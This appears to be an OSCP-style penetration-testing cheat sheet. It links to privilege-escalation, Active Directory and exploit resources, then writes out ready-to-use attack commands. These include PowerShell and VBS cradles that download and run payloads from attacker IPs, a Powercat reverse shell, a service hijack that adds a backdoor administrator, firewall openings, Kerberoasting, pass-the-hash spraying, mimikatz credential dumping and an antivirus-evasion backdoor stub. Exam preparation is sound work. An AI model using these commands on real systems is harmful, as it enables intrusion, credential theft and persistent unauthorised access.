
## Reverse Shell Generator

[Revshells generator](https://www.revshells.com/)

[Msfvenom commands](https://github.com/ferreirasc/oscp/tree/master/payloads)

## One liner reverse shells

[One liner reverse shells](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

## Windows Privesc Additional Resources

[PayloadsAllTheThings Windows Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Payatu Windows Privesc Guide](https://payatu.com/blog/windows-privilege-escalation/)

[Hacktricks Windows Privesc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)

[Fuzzysecurity Windows Privesc](https://www.fuzzysecurity.com/tutorials/16.html)

## Linux Privesc Additional Resources

[Hacktricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

[Payatu Linux Privesc Guide](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/)

[Basic Linux Privesc Guide](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Linux Privesc Resource](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

[PayloadsAllTheThings Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[Linuxeop Linux Privesc](https://guif.re/linuxeop)

[Check binary for potential escalation](https://gtfobins.github.io/)

## File Transfers Additional Resources

[File Transfers Ways](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)

[File Transfers cheatsheet](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)

## Precompiled Binaries / exploits

[Windows precompiled kernel exploits binaries](https://github.com/SecWiki/windows-kernel-exploits)

[Linux precompiled kernel exploits binaries](https://github.com/SecWiki/linux-kernel-exploits)

[Useful Pentest Binaries](https://github.com/V-i-x-x/Resources/tree/main/pentestResources)

## mimikatz

[Mimikatz sekurlsa](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa)

[Mimikatz lsadump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)

[Mimikatz PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#open-shares)

### Powerview Reference

[PowerView for pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)

[PowerView-3.0 tips and tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993#file-powerview-3-0-tricks-ps1)

### Active Directory Reference

[Active Directory Methodology](https://book.hacktricks.xyz/windows/active-directory-methodology)

[Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)

[PayloadsAllTheThings AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

[Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)

[Pentest AD](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)

[PowerView-3.0 tips and tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993#file-powerview-3-0-tricks-ps1)

## CLOUD AWS Enumeration Resources

[aws s3 bucket enumeration](https://medium.com/@narenndhrareddy/misconfigured-aws-s3-bucket-enumeration-7a01d2f8611b)

[aws s3 unauthenticated enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum)

[aws awesome tools](https://github.com/mxm0z/awesome-sec-s3)

## Exam Guide

[Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide-Newly-Updated)

[Review & Guide](https://medium.com/@shivamsharma.ss484/from-setbacks-to-success-my-oscp-journey-2024-efaa57106834)

## Practice platform

Vulnhub - https://www.vulnhub.com/

## Powershell Usefull Cradles to Download File

```
powershell.exe -NoP -NonI -Exec Bypass IEX "(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.117/shell443.exe','shell443.exe')"
```

## Powershell Usefull Cradles to Download Script to memory and Execute it

This Example will download Powercat to memory and execute a reverse shell using Powercat without touching the disk

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString("http://172.16.242.173/powercat.ps1"); powercat -c 172.16.242.173 -p 4444 -e cmd.exe
```

You can use this technique to download any script to memory and execute functions from it like Powerview also

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
```

## VBS Cradle to Download Transfer File and Execute it

Transfer exploit.exe from your kali server to the target server and execute it

```
cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.119.142/exploit.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "exploit.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("exploit.exe")>>poc.vbs&cscript.exe poc.vbs"
```

## Reconfigure a service

Reconfigure Service:

```
sc config ServiceName depend= "" start= demand binpath= "C:\Inetpub\wwwroot\shell443.exe" obj= ".\LocalSystem" password= ""
sc config ServiceName binPath= "cmd /c net user haxxor haxxor123 /add && net localgroup Administrators haxxor /add && net localgroup 'Remote Desktop Users' haxxor /add"
```

## Open /Allow Ports in Firewall
Allow Ports 80, 443 and 4444 as Inbound and outbound rules in the firewall (needs admin priveleges)

```
netsh advfirewall firewall add rule action=allow name=tunnelI dir=in protocol=tcp localport='80,443,4444'
netsh advfirewall firewall add rule action=allow name=tunnelO dir=out protocol=tcp remoteport='80,443,4444'
```
## Active Directory Useful Commands

### Import Powerview into memory and execute commands

```
powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/powerview.ps1'); Get-DomainController
```

## Kerberoasting

InvokeKerberoast powershell script will request a service ticket from the DC for the service accounts which you can then copy and crack

```
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.101.24/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000
hashcat -m 13100 -o cracked.txt -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

## Password Spraying using crackmapexec

```
crackmapexec smb 192.168.101.0/24 --local-auth -u Administrator -H a0989207854b684f07b5b6fe68169a35
crackmapexec smb 192.168.101.0/24 -u vixx -H 'aad3b435b51404eeaa35b51404ee:a0989207854b684f07b5b6fe68169a35'
```

## OverPass the hash using mimikatz commands

Dump hash and open a cmd shell as vixx using mimikatz(over pass the hash)

```
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:vixx /domain:vixx.domain /ntlm:a0989207854b684f07b5b6fe68169a35 /run:PowerShell.exe
```

## Dump Local users NTLM hashes using mimikatz

```
privilege::debug
token::elevate
lsadump::sam
```

## AV Simple Effective Bypass

You can compile c# code in powershell and create a binary.
Run the following POC in powershell:

$code = @"
using System;
namespace AddUsers
{
    public class AddUsers
    {
        public static void Main(){
            System.Diagnostics.Process Process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo strtInfo = new System.Diagnostics.ProcessStartInfo();
            strtInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            strtInfo.FileName = "cmd.exe";
            strtInfo.Arguments = "/c whoami";
            Process.StartInfo = strtInfo;
            Process.Start();
            Console.WriteLine("User Created");
        }
    }
}
"@
Add-Type -outputtype consoleapplication -outputassembly backdoor.exe -TypeDefinition $code -Language CSharp